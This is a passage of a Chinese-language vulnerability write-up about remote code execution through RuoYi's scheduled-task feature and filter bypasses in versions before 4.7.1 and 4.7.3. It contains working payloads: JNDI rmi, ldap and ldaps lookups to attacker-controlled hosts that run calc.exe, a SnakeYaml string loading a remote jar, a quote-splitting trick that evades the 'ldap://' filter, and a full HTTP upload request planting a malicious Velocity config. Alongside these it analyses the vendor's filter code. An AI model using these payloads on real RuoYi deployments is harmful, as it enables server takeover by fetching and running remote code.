以前毫无限制，想怎么执行就怎么执行，有相应依赖也可以直接反序列化执行命令；</p><h2 id="4-2-定时任务-RCE-bypass1（"><a href="#4-2-定时任务-RCE-bypass1（" class="headerlink" title="4.2 定时任务 RCE bypass1（&lt;V4.7.1）"></a>4.2 定时任务 RCE bypass1（&lt;V4.7.1）</h2><h3 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>bypass1 的 payload 如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">rmi: org.springframework.jndi.JndiLocatorDelegate.lookup(<span class="hljs-string">&#x27;r&#x27;</span>mi:<span class="hljs-comment">//192.168.10.129:8888/Calc&#x27;)</span><br>ldap: javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ld&#x27;</span>ap:<span class="hljs-comment">//192.168.10.129:8888/#Calc&#x27;)</span><br>SnakeYaml: org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;ht&#x27;</span>tp:<span class="hljs-comment">//192.168.31.246:8000/yaml-payload.jar&#x27;]]]]&#x27;)</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749404476-7b5c0ab8-eb30-41e7-80ad-2ec151b586b1.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749478292-ae82a551-84a2-4163-b666-d3e61e5bf528.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ld&#x27;</span>ap:<span class="hljs-comment">//xx.xx.xxx.xx:1389/Basic/Command/calc.exe&#x27;)</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749500213-4f106d97-20bf-4989-bb41-6477afa4750a.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754749572763-11da9b25-2526-4689-a529-a9bed5a564a1.png"></p><p>在 V4.7.1 版本中添加了对执行方法的过滤，不允许执行<code>org.springframework.jndi</code>、<code>javax.naming.InitialContext</code>、<code>org.yaml.snakeyaml</code>、<code>java.net.URL</code>，因此仅通过<code>&#39;</code>去绕过已经不能够实现</p><h3 id="漏洞分析-12"><a href="#漏洞分析-12" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>详细的定时任务添加和执行可以参考 4.1 小节的漏洞分析；</p><p>在 4.7.1 时对定时任务调用的目标字符串进行了过滤，过滤了<code>rmi://</code>、<code>ldap://</code>、<code>http(s)://</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增保存调度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.INSERT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:add&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">addSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-keyword">if</span> (!CronUtils.isValid(job.getCronExpression()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，Cron表达式不正确&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_RMI))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;rmi://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_LDAP))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;ldap://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; Constants.HTTP, Constants.HTTPS &#125;))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;http(s)//&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> toAjax(jobService.insertJob(job));<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了上述的内容只要尝试绕过即可，通过<code>ldaps://</code>即可实现绕过；但是 <code>ldaps://</code>有点难搭建，因此尝试通过其他方法进行过滤</p><p>通过观察定时任务执行过程中的执行函数<code>invokeMethod</code>，其在获取方法参数<code>List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);</code>的过程中参在问题，因此导致的漏洞；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 执行方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> sysJob 系统任务</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">invokeTarget</span> <span class="hljs-operator">=</span> sysJob.getInvokeTarget();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> getBeanName(invokeTarget);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> getMethodName(invokeTarget);<br>    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);<br>    <span class="hljs-keyword">if</span> (!isValidClassName(beanName))<br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> SpringUtils.getBean(beanName);<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> Class.forName(beanName).newInstance();<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于这个函数对参数的处理，将<code>&#39;</code>替换为 null，从而导致可以通过<code>&#39;ld&#39;ap://xxx.xx.xx.xxx:1389/&#39;</code>绕过<code>ldap://</code>的过滤；因为在执行过程中都会将<code>&#39;</code>替换掉，从而获取参数<code>ldap://xxx.xx.xx.xxx:1389/</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取method方法参数相关列表</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> invokeTarget 目标字符串</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> method方法相关参数列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Object[]&gt; getMethodParams(String invokeTarget)<br>&#123;<br>    <span class="hljs-comment">// 获取由()包裹的内容</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodStr</span> <span class="hljs-operator">=</span> StringUtils.substringBetween(invokeTarget, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(methodStr))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// 根据逗号,分割内容</span><br>    String[] methodParams = methodStr.split(<span class="hljs-string">&quot;,&quot;</span>);<br>    List&lt;Object[]&gt; classs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; methodParams.length; i++)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringUtils.trimToEmpty(methodParams[i]);<br>        <span class="hljs-comment">// String字符串类型，包含&#x27;</span><br>        <span class="hljs-keyword">if</span> (StringUtils.contains(str, <span class="hljs-string">&quot;&#x27;&quot;</span>))<br>        &#123;<br>            <span class="hljs-comment">//若分割出来的字符串中包含&#x27;，则将其替换为null</span><br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; StringUtils.replace(str, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>), String.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// boolean布尔类型，等于true或者false</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.equals(str, <span class="hljs-string">&quot;true&quot;</span>) || StringUtils.equalsIgnoreCase(str, <span class="hljs-string">&quot;false&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Boolean.valueOf(str), Boolean.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// long长整形，包含L</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">&quot;L&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Long.valueOf(StringUtils.replaceIgnoreCase(str, <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)), Long.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// double浮点类型，包含D</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">&quot;D&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Double.valueOf(StringUtils.replaceIgnoreCase(str, <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)), Double.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// 其他类型归类为整形</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Integer.valueOf(str), Integer.class &#125;);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> classs;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-3-定时任务-RCE-bypass2（"><a href="#4-3-定时任务-RCE-bypass2（" class="headerlink" title="4.3 定时任务 RCE bypass2（&lt;V4.7.3）"></a>4.3 定时任务 RCE bypass2（&lt;V4.7.3）</h2><h3 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先阅读 4.1 小节的漏洞分析，了解定时任务的执行流程；</p><p>这里的 RCE 的方法还挺多的具体参考：<a href="https://xz.aliyun.com/news/10405">https://xz.aliyun.com/news/10405</a></p><ul><li><strong>ldaps 绕过</strong></li></ul><p>这种过滤方法能够成功，但是我在复现的过程中遇到了证书问题，要求是需要配置相关的证书这种也是没有进一步的配置。</p><p>本次漏洞复现需要使用到工具：<a href="https://github.com/phith0n/tls_proxy">https://github.com/phith0n/tls_proxy</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.jdbc.datasource.lookup.JndiDataSourceLookup.getDataSource(<span class="hljs-string">&#x27;ldaps://xx.xx.xxx.xx:1388/Basic/Command/calc.exe&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在版本 V4.7.3 中将<code>ldap://</code>的过滤修改为对<code>ldap</code>进行过滤，因此不能够在使用<code>ldaps</code>进行绕过；</p><ul><li><strong>配置文件 RCE</strong></li></ul><p>若依中有个文件上传接口<code>/common/upload</code>，可以通过该接口实现文件上传将配置文件上传到服务端；然后使用<code>org.apache.velocity.runtime.RuntimeInstance.init</code>加载这个配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">resource.loader = ds<br>ds.resource.loader.<span class="hljs-keyword">public</span>.name = DataSource<br>ds.resource.loader.description = Velocity DataSource Resource Loader<br>ds.resource.loader.class = org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader<br>ds.resource.loader.datasource_url = ldap:<span class="hljs-comment">//xx.xx.xxx.xx:1388/Basic/Command/calc.exe</span><br>ds.resource.loader.resource.table = tb_velocity_template<br>ds.resource.loader.resource.keycolumn = id_template<br>ds.resource.loader.resource.templatecolumn = template_definition<br>ds.resource.loader.resource.timestampcolumn = template_timestamp<br>ds.resource.loader.cache = <span class="hljs-literal">false</span><br>ds.resource.loader.modificationCheckInterval = <span class="hljs-number">60</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">POST /common/upload HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.9</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">141.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">141.0</span><br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: multipart/form-data; boundary=----geckoformboundary4e4431b166ddca122d213d464704255e</span><br><span class="hljs-comment">Content-Length: 860</span><br><span class="hljs-comment">Origin: null</span><br><span class="hljs-comment">Cookie: JSESSIONID=e09af19d-5ba6-4ae2-899d-125e293ae3df</span><br><span class="hljs-comment">Connection: keep-alive</span><br><span class="hljs-comment">Priority: u=0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------geckoformboundary4e4431b166ddca122d213d464704255e</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;velocity.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">resource.loader = ds</span><br><span class="hljs-comment">ds.resource.loader.public.name = DataSource</span><br><span class="hljs-comment">ds.resource.loader.description = Velocity DataSource Resource Loader</span><br><span class="hljs-comment">ds.resource.loader.class = org.apache.velocity.runtime.resource.loader.DataSourceResourceLoader</span><br><span class="hljs-comment">ds.resource.loader.datasource_url = ldap://xx.xx.xxx.xx:1388/Basic/Command/calc.exe</span><br><span class="hljs-comment">ds.resource.loader.resource.table = tb_velocity_template</span><br><span class="hljs-comment">ds.resource.loader.resource.keycolumn = id_template</span><br><span class="hljs-comment">ds.resource.loader.resource.templatecolumn = template_definition</span><br><span class="hljs-comment">ds.resource.loader.resource.timestampcolumn = template_timestamp</span><br><span class="hljs-comment">ds.resource.loader.cache = false</span><br><span class="hljs-comment">ds.resource.loader.modificationCheckInterval = 60</span><br><span class="hljs-comment">------geckoformboundary4e4431b166ddca122d213d464704255e--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904759348-7673fd94-148b-4b42-a70e-55da879fb4d0.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//192.168.1.9/profile/upload/2025/08/11/7c862b8b-e72f-4b61-ae38-95f15403ac21.txt</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.apache.velocity.runtime.RuntimeInstance.init(<span class="hljs-string">&#x27;C:/code/Java/RuoYi/upload/upload/2025/08/11/7c862b8b-e72f-4b61-ae38-95f15403ac21.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904808595-bda62aab-4b2b-445b-8f4d-51a0768b259e.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904840977-6bb2f97c-6e05-4fd1-8388-fe8ea181f511.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754904795326-0f91a9ab-b0a9-4212-8c34-ff31209f6583.png"></p><h3 id="漏洞分析-13"><a href="#漏洞分析-13" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先阅读 4.1 小节的漏洞分析，了解定时任务的执行流程；</p><p>这里的漏洞分析只针对 ldaps bypass 的分析，对于配置文件 RCE 的方法我这里就不进行分析了</p><blockquote><p>配置文件 RCE 的方法简单来说就是让 velocity 使用我们设定的配置文件重新加载，在重新加载的过程中触发了远程 ldap 请求导致的 rce；</p></blockquote><p>根据下面方法的具体内容，也是可以发现，通过<code>&#39;ld&#39;ap://&#39;</code>方式进行绕过已经不能够实现了；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取method方法参数相关列表</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> invokeTarget 目标字符串</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> method方法相关参数列表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Object[]&gt; getMethodParams(String invokeTarget)<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodStr</span> <span class="hljs-operator">=</span> StringUtils.substringBetween(invokeTarget, <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;)&quot;</span>);<br>    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(methodStr))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    String[] methodParams = methodStr.split(<span class="hljs-string">&quot;,(?=([^\&quot;&#x27;]*[\&quot;&#x27;][^\&quot;&#x27;]*[\&quot;&#x27;])*[^\&quot;&#x27;]*$)&quot;</span>);<br>    List&lt;Object[]&gt; classs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; methodParams.length; i++)<br>    &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> StringUtils.trimToEmpty(methodParams[i]);<br>        <span class="hljs-comment">// String字符串类型，以&#x27;或&quot;开头</span><br>        <span class="hljs-keyword">if</span> (StringUtils.startsWithAny(str, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; StringUtils.substring(str, <span class="hljs-number">1</span>, str.length() - <span class="hljs-number">1</span>), String.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// boolean布尔类型，等于true或者false</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;true&quot;</span>.equalsIgnoreCase(str) || <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(str))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Boolean.valueOf(str), Boolean.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// long长整形，以L结尾</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.endsWith(str, <span class="hljs-string">&quot;L&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Long.valueOf(StringUtils.substring(str, <span class="hljs-number">0</span>, str.length() - <span class="hljs-number">1</span>)), Long.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// double浮点类型，以D结尾</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.endsWith(str, <span class="hljs-string">&quot;D&quot;</span>))<br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Double.valueOf(StringUtils.substring(str, <span class="hljs-number">0</span>, str.length() - <span class="hljs-number">1</span>)), Double.class &#125;);<br>        &#125;<br>        <span class="hljs-comment">// 其他类型归类为整形</span><br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            classs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; Integer.valueOf(str), Integer.class &#125;);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> classs;<br>&#125;<br></code></pre></td></tr></table></figure><p>尽管如何，在添加定时任务时，并没有对<code>ldaps</code>进行过滤，因此仍然能够通过<code>ldaps</code>协议实现 rce；（只是 ldaps 并没有那么容易实现就是啦）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增保存调度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.INSERT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:add&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">addSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-keyword">if</span> (!CronUtils.isValid(job.getCronExpression()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，Cron表达式不正确&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_RMI))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;rmi://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_LDAP))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;ldap://&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; Constants.HTTP, Constants.HTTPS &#125;))<br>    &#123;<br>        <span class="hljs-keyword">return</span> error(<span class="hljs-string">&quot;新增任务&#x27;&quot;</span> + job.getJobName() + <span class="hljs-string">&quot;&#x27;失败，目标字符串不允许&#x27;http(s)//&#x27;调用&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), 